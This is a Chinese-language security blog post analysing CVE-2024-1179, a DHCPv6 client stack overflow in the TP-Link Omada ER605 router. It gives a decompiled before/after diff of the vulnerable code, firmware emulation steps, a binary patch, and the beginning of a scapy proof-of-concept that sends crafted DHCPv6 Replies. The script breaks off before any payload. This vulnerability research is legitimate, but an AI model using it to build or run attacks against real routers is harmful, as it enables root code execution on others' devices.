<!DOCTYPE html><html lang="en"><head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <meta name="description" content="Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605 该漏洞在Pwn2Own中被利用    CVE ID CVE-2024-1179    CVSS SCORE 7.5, AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H   AFFECTED VENDORS TP-Link   AFFECTED PROD">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605">
<meta property="og:url" content="http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/index.html">
<meta property="og:site_name" content="z1r0's blog">
<meta property="og:description" content="Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605 该漏洞在Pwn2Own中被利用    CVE ID CVE-2024-1179    CVSS SCORE 7.5, AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H   AFFECTED VENDORS TP-Link   AFFECTED PROD">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/2.png">
<meta property="og:image" content="http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/1.png">
<meta property="article:published_time" content="2024-03-22T12:05:30.000Z">
<meta property="article:modified_time" content="2024-04-02T01:54:21.937Z">
<meta property="article:author" content="z1r0">
<meta property="article:tag" content="RW">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/2.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="z1r0's blog" type="application/atom+xml">
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.1.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;text=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;title=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;is_video=false&amp;description=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605&amp;body=Check out this article: http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;title=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;title=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;title=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;title=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;name=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;t=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn2Own-TORONTO-2023-CVE-2024-1179-amp-TP-Link-Omada-ER605"><span class="toc-number">1.</span> <span class="toc-text">Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-amp-%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.1.</span> <span class="toc-text">介绍&amp;固件下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.3.</span> <span class="toc-text">固件模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poc"><span class="toc-number">1.4.</span> <span class="toc-text">Poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
        <span itemprop="name">z1r0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-22T12:05:30.000Z" itemprop="datePublished">2024-03-22</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Poc/">Poc</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/RW/" rel="tag">RW</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Pwn2Own-TORONTO-2023-CVE-2024-1179-amp-TP-Link-Omada-ER605"><a href="#Pwn2Own-TORONTO-2023-CVE-2024-1179-amp-TP-Link-Omada-ER605" class="headerlink" title="Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"></a>Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605</h1><blockquote>
<p>该漏洞在<a target="_blank" rel="noopener" href="https://www.zerodayinitiative.com/advisories/ZDI-24-085/">Pwn2Own</a>中被利用</p>
<table>
<thead>
<tr>
<th>CVE ID</th>
<th><a target="_blank" rel="noopener" href="https://www.cve.org/CVERecord?id=CVE-2024-1179">CVE-2024-1179</a></th>
</tr>
</thead>
<tbody><tr>
<td>CVSS SCORE</td>
<td>7.5, <a target="_blank" rel="noopener" href="http://nvd.nist.gov/cvss.cfm?calculator&amp;version=3.0&amp;vector=AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H">AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H</a></td>
</tr>
<tr>
<td>AFFECTED VENDORS</td>
<td>TP-Link</td>
</tr>
<tr>
<td>AFFECTED PRODUCTS</td>
<td><a target="_blank" rel="noopener" href="https://www.tp-link.com/us/business-networking/omada-sdn-router/er605/">Omada ER605</a></td>
</tr>
<tr>
<td>VULNERABILITY DETAILS</td>
<td>This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of TP-Link Omada ER605 routers. Authentication is not required to exploit this vulnerability.The specific flaw exists within the handling of DHCP options. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root.</td>
</tr>
<tr>
<td>ADDITIONAL DETAILS</td>
<td>Fixed in firmware: ER605(UN)_V2_2.2.4 Build 20240119</td>
</tr>
</tbody></table>
</blockquote>
<h2 id="介绍-amp-固件下载"><a href="#介绍-amp-固件下载" class="headerlink" title="介绍&amp;固件下载"></a>介绍&amp;固件下载</h2><p>由于对dhcpv6的不熟悉，一开始在做漏洞分析的时候有个问题困扰了我，有dhcp6s这个服务端的存在，为什么漏洞点在client端，而且client端会挂载到546这个端口上，在经过学习了解后知道了client会接收server发送的确认报文</p>
<p>所以漏洞点都能猜到是在处理接收报文时发生的</p>
<p><img src="/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/2.png" alt="1"></p>
<p>修复固件：<a target="_blank" rel="noopener" href="https://static.tp-link.com/upload/firmware/2024/202401/20240124/ER605(UN)_v2_2.2.4%20Build%2020240119.zip">下载链接</a></p>
<p>漏洞固件：<a target="_blank" rel="noopener" href="https://static.tp-link.com/upload/firmware/2023/202312/20231221/ER605(UN)_v2_2.2.3%20Build%2020231201.zip">下载链接</a></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>将Fix版本和漏洞版本进行diff，根据漏洞描述，可以很快速的确认漏洞点在<code>dhcpv6-client</code>中，将<code>dhcpv6c</code>进行具体的diff，发现了一个函数内memest附近有被fix的情况，基本确定此文件为漏洞文件</p>
<p>这是一个发生在<code>dhcpv6 client</code>中的漏洞，而这个binary在网上有一部分公开的源码，<a target="_blank" rel="noopener" href="https://github.com/garybuhrmaster/wide-dhcpv6/tree/main">下载链接</a>，借助这个源码来辅助分析大大减低了逆向工作量</p>
<p><code>0x405F08</code>这个函数中发现了关键fix</p>
<p><img src="/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/1.png" alt="1"></p>
<p>fix版本对case64这里的memcpy条件进行了限制</p>
<p>在处理aftr_name时，将字符组合时没有大小检查导致的溢出</p>
<p>这是漏洞版本</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">if</span> ( optlen )</span><br><span class="line">        {</span><br><span class="line">          v65 = (a3 + <span class="number">232</span>);</span><br><span class="line">          <span class="keyword">if</span> ( a3 != <span class="number">-232</span> )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( cp )</span><br><span class="line">            {</span><br><span class="line">              tlen = tlen[<span class="number">4</span>];</span><br><span class="line">              v64 = <span class="number">1</span>;</span><br><span class="line">              opt = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( tlen )</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span> ( optlen &lt; tlen )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="built_in">memcpy</span>(&amp;v65[opt], cp + v64, tlen);</span><br><span class="line">                v15 = &amp;tlen[v64];</span><br><span class="line">                <span class="keyword">if</span> ( &amp;tlen[v64] &gt;= optlen )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                v16 = &amp;tlen[opt];</span><br><span class="line">                v64 = (v15 + <span class="number">1</span>);</span><br><span class="line">                tlen = v15[cp];</span><br><span class="line">                opt = (v16 + <span class="number">1</span>);</span><br><span class="line">                v16[v65] = <span class="number">46</span>;</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">        }</span><br></pre></td></tr></tbody></table></figure>

<p>这是fix版本</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !v62 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_110;</span><br><span class="line">        v66 = (<span class="type">const</span> <span class="type">char</span> *)(a3 + <span class="number">232</span>);</span><br><span class="line">        <span class="keyword">if</span> ( a3 == <span class="number">-232</span> || !cp )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_110;</span><br><span class="line">        size = (<span class="type">unsigned</span> __int8 *)(<span class="type">char</span>)size[<span class="number">4</span>];</span><br><span class="line">        v65 = <span class="number">1</span>;</span><br><span class="line">        opt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( !size )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_110;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">int</span>)size &lt; <span class="number">0</span> || v62 &lt; (<span class="type">int</span>)size || (<span class="type">int</span>)size &gt;= <span class="number">64</span> - opt )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">memcpy</span>(&amp;v66[opt], cp + v65, size);</span><br><span class="line">          v16 = (<span class="type">const</span> <span class="type">char</span> *)&amp;size[v65];</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">int</span>)&amp;size[v65] &gt;= v62 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_110;</span><br><span class="line">          v17 = &amp;size[opt];</span><br><span class="line">          v65 = (<span class="type">int</span>)(v16 + <span class="number">1</span>);</span><br><span class="line">          size = (<span class="type">unsigned</span> __int8 *)v16[cp];</span><br><span class="line">          opt = (<span class="type">int</span>)(v17 + <span class="number">1</span>);</span><br><span class="line">          v17[(_DWORD)v66] = <span class="number">46</span>;</span><br><span class="line">        }</span><br><span class="line">        sub_4043BC(<span class="number">6</span>, <span class="string">"getAftrName"</span>, <span class="string">"tlen is more than DHCP6_AFTRNAME_SIZE"</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_110;</span><br></pre></td></tr></tbody></table></figure>

<h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>接下来需要编写Poc来触发此漏洞，这里的dhcpv6需要一些配置文件，所以采取qemu-system来模拟，搭建一个给qemu-system用的网络</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig ens32 down</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 ens32</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up</span><br><span class="line">sudo ifconfig ens32 0.0.0.0 promisc up</span><br><span class="line">sudo dhclient br0</span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo brctl addif br0 tap0</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up</span><br><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_wheezy_mips_standard.qcow2 \</span><br><span class="line">    -append <span class="string">"root=/dev/sda1"</span> \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br><span class="line">bash run.sh</span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig eth0 192.168.10.200/24 up</span></span><br><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev</span><br><span class="line"><span class="built_in">chroot</span> ./squashfs-root/ sh</span><br></pre></td></tr></tbody></table></figure>

<p>发现并没有<code>/etc/init.d/rcS</code>，需要手动启动dhcp6c，<code>/etc/init.d/dhcp6c</code>这个也启动不了，改了一些东西总是失败</p>
<p>在启动前需要patch一个地方，将&lt;0改成&gt;=0，ida patch会失败，@cdm258帮我用010修改了，<code>0A 61 00 1A B8 65 00 65 00 1A 70 64 80 9A E2 67</code></p>
<p>patch前</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( setsockopt(sock, <span class="number">0xFFFF</span>, <span class="number">512</span>, &amp;v41, <span class="number">4</span>) &lt; <span class="number">0</span> )</span><br><span class="line">              {</span><br><span class="line">                v16 = _errno_location();</span><br><span class="line">                v17 = strerror(*v16);</span><br><span class="line">                v18 = <span class="string">"setsockopt(SO_REUSEPORT): %s"</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_66;</span><br><span class="line">              }</span><br></pre></td></tr></tbody></table></figure>

<p>patch后</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( setsockopt(sock, <span class="number">0xFFFF</span>, <span class="number">512</span>, &amp;v41, <span class="number">4</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">              {</span><br><span class="line">                v16 = _errno_location();</span><br><span class="line">                v17 = strerror(*v16);</span><br><span class="line">                v18 = <span class="string">"setsockopt(SO_REUSEPORT): %s"</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_66;</span><br><span class="line">              }</span><br></pre></td></tr></tbody></table></figure>

<p>接着用以下命令就可以启动dhcp6c了，dhcp6c正常挂载到了546端口上，这个dhcp6c.conf是手动创建的，里面空的（我后面觉得完全可以直接qemu-user来启动，因为不熟悉dhcpv6，走了很多弯路</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># /usr/sbin/dhcp6c -c /tmp/dhcp6c/dhcp6c.conf -Df eth0</span></span><br><span class="line">/ <span class="comment"># netstat -unap</span></span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">udp        0      0 0.0.0.0:54249           0.0.0.0:*                           1525/rpc.statd</span><br><span class="line">udp        0      0 0.0.0.0:821             0.0.0.0:*                           1494/rpcbind</span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           2237/dhclient</span><br><span class="line">udp        0      0 127.0.0.1:853           0.0.0.0:*                           1525/rpc.statd</span><br><span class="line">udp        0      0 0.0.0.0:111             0.0.0.0:*                           1494/rpcbind</span><br><span class="line">udp        0      0 0.0.0.0:52945           0.0.0.0:*                           2237/dhclient</span><br><span class="line">udp        0      0 :::546                  :::*                                2380/dhcp6c</span><br><span class="line">udp        0      0 :::46377                :::*                                1525/rpc.statd</span><br><span class="line">udp        0      0 :::821                  :::*                                1494/rpcbind</span><br><span class="line">udp        0      0 :::61764                :::*                                2237/dhclient</span><br><span class="line">udp        0      0 :::111                  :::*                                1494/rpcbind</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><p>这是第一份远程有响应的Poc，这里有@starrysky的帮助</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet6 <span class="keyword">import</span> IPv6, UDP</span><br><span class="line"><span class="keyword">from</span> scapy.layers.dhcp6 <span class="keyword">import</span> DHCP6_Reply, DHCP6OptServerId, DHCP6OptClientId</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'mips'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'192.168.10.200'</span></span><br><span class="line">port = <span class="number">546</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_dhcp6_reply_and_listen</span>(<span class="params">interface, src_ipv6, dst_ipv6, src_mac, dst_mac, transaction_id</span>):</span><br><span class="line">    <span class="comment"># 构造以太网层</span></span><br><span class="line">    ether_layer = Ether(src=src_mac, dst=dst_mac)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造IPv6层</span></span><br><span class="line">    ipv6_layer = IPv6(src=src_ipv6, dst=dst_ipv6)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造UDP层</span></span><br><span class="line">    udp_layer = UDP(sport=<span class="number">547</span>, dport=<span class="number">546</span>)  <span class="comment"># 注意端口号，服务器端是547，客户端是546</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造DHCPv6 REPLY消息</span></span><br><span class="line">    dhcp6_reply = DHCP6_Reply(trid=transaction_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造Server ID选项</span></span><br><span class="line">    server_id = DHCP6OptServerId(duid=DUID_LLT(hwtype=<span class="number">1</span>, lladdr=src_mac))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造Client ID选项</span></span><br><span class="line">    client_id = DHCP6OptClientId(duid=DUID_LLT(hwtype=<span class="number">1</span>, lladdr=dst_mac))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 组合所有层</span></span><br><span class="line">    packet = ether_layer / ipv6_layer / udp_layer / dhcp6_reply / server_id / client_id</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送数据包</span></span><br><span class="line">    sendp(packet, iface=interface, verbose=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"DHCPv6 Reply消息已发送，等待响应..."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置监听过滤器，捕获DHCPv6 Solicit或Request等消息作为响应</span></span><br><span class="line">   